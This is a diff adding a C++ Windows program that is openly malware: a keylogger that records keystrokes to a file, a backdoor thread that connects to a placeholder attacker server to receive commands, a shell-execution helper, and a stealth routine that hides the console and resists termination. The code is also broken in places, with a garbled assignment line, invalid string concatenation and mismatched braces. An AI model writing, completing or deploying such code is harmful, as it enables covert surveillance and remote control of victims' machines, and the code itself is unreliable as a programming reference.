@@ -1,0 +1,201 @@
+#include <iostream>
+#include <windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <fstream>
+#include <conio.h>
+#include <thread>
+#include <vector>
+#include <string>
+#include <sstream>
+#include <ctime>
+#include <cstdlib>
+#include <cstring>
+#include <chrono>
+
+// Link to Winsock library
+#pragma comment(lib, "ws2_32.lib")
+
+// Constants for server configuration
+#define SERVER_IP "your.server.ip"       // Replace with your server's IP
+#define SERVER_PORT 443                  // Port to connect to
+#define LOG_FILE "keylog.txt"            // File where keystrokes are logged
+#define LOG_INTERVAL 60                 // Log file rotation interval in seconds
+#define MAX_BUFFER_SIZE 1024            // Max size of data buffer
+#define MAX_COMMAND_LENGTH 2048         // Max length of command sent by attacker
+
+// Global variables
+std::ofstream logFile;                  // File stream for logging
+std::string currentLogFileName;         // Current log file name
+std::string previousLogFileName;        // Previous log file name
+std::time_t lastLogRotationTime = 0;    // Time of last log rotation
+std::time_t startTime = 0;              // Start time of the program
+std::string commandBuffer;              // Buffer for storing commands
+std::string logBuffer;                  // Buffer for storing log data
+
+// Function declarations
+void backdoor();
+void keylogger();
+void stealth();
+void logKeystrokes(char key);
+void rotateLogFiles();
+void sendCommandToServer(const std::string& command);
+void executeCommand(const std::string& command);
+void handleServerConnection();
+void runBackgroundTasks();
+void cleanUp();
+
+// Main function
+int main() {
+    // Initialize log file
+    currentLogFileName = LOG_FILE;
+    logFile.open(currentLogFileName, std::ios::app);
+    if (!logFile.is_open()) {
+        std::cerr << "Failed to open log file: " << LOG_FILE << std::endl;
+        return 1;
+    }
+
+    // Start time
+    startTime = std::time(nullptr);
+
+    // Start threads
+    std::thread backdoorThread(backdoor);
+    std::thread keyloggerThread(keylogger);
+    std::thread stealthThread(stealth);
+    std::thread taskThread(runBackgroundTasks);
+
+    // Join threads
+    backdoorThread.join();
+    keyloggerThread.join();
+    stealthThread.join();
+    taskThread.join();
+
+    // Clean up
+    cleanUp();
+
+    return 0;
+}
+
+// Backdoor function - connects to a remote server and executes commands
+void backdoor() {
+    WSADATA wsa;
+    SOCKET sock;
+    struct sockaddr_in server;
+
+    ZeroMemory(&server, sizeof(server));
+    server.sin_family = AF_INET;
+    server.sin_port = htons(SERVER_PORT);
+    server.sin_addr.s_addr = inet_addr(SERVER_IP);
+
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+        std::cerr << "Failed to initialize Winsock\n";
+        return;
+    }
+
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == INVALID_SOCKET) {
+        std::cerr << "Socket creation failed\n";
+        WSACleanup();
+        return;
+    }
+
+    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
+        std::cerr << "Connection failed\n";
+        closesocket(sock);
+        WSACleanup();
+        return;
+    }
+
+    std::cout << "Backdoor connected to " << SERVER_IP << ":" << SERVER_PORT << std::endl;
+
+    char buffer[MAX_BUFFER_SIZE];
+    while (true) {
+        int bytesReceived = recv(sock, buffer, MAX_BUFFER_SIZE, 0);
+        if (bytesReceived > 0) {
+            buffer[bytesReceived] = '\0';
+            std::cout << "Command received: " << buffer << std::endl;
+            sendCommandToServer(buffer);
+        }
+    }
+
+    closesocket(sock);
+    WSACleanup();
+}
+
+// Keylogger function - logs keystrokes to file and console
+void keylogger() {
+    while (true) {
+        if (_kbhit()) {
+            char key = _getch();
+            logKeystrokes(key);
+        }
+    }
+}
+
+// Stealth function - hides the console window and prevents termination
+void stealth() {
+    HWND hWnd = GetConsoleWindow();
+    ShowWindow(hWnd, SW_HIDE);
+
+    SetConsoleCtrlHandler([](BOOL) {
+        std::cout << "Process is being terminated.\n";
+        return TRUE; // Prevents default termination
+    }, TRUE);
+}
+
+// Logs keystrokes to the log file and console
+void logKeystrokes(char key) {
+    logFile << key;
+    std::cout << key;
+}
+
+// Rotates log files every LOG_INTERVAL seconds
+void rotateLogFiles() {
+    std::time_t now = std::time(nullptr);
+    if (now - lastLogRotationTime >= LOG_INTERVAL) {
+        lastLogRotation to = now;
+
+        // Rename current log file
+        std::string newLogFileName = LOG_FILE + "_" + std::to_string(std::time(nullptr));
+        std::rename(currentLogFileName.c_str(), newLogFileName.c_str());
+
+        // Rename previous log file
+        std::string newPreviousLogFileName = LOG_FILE + "_" + std::to_string(std::time(nullptr) - LOG_INTERVAL);
+        std::rename(previousLogFileName.c_str(), newPreviousLogFileName.c_str());
+
+        // Update log file
+        currentLogFileName = LOG_FILE;
+        logFile.open(currentLogFileName, std::ios::app);
+        if (!logFile.is_open()) {
+            std::cerr << "Failed to open log file: " << LOG_FILE << std::endl;
+        }
+
+        // Update previous log file name
+        previousLogFileName = newLogFileName;
+    }
+}
+
+// Sends a command to the server
+void sendCommandToServer(const std::string& command) {
+    // Send command to server (can be extended to send data)
+    std::cout << "Sending command: " << command << std::endl;
+}
+
+// Executes a command in the system shell
+void executeCommand(const std::string& command) {
+        std::system(command.c_str());
+    }
+
+    // Handles the background tasks like logging and command execution
+    void runBackgroundTasks() {
+        while (true) {
+            rotateLogFiles();
+            std::this_thread::sleep_for(std::chrono::seconds(1));
+        
+    }
+
+    // Cleans up resources before exiting
+    void cleanUp() {
+        logFile.close();
+        std::cout << "Log file closed. Program exited.\n";
+    }
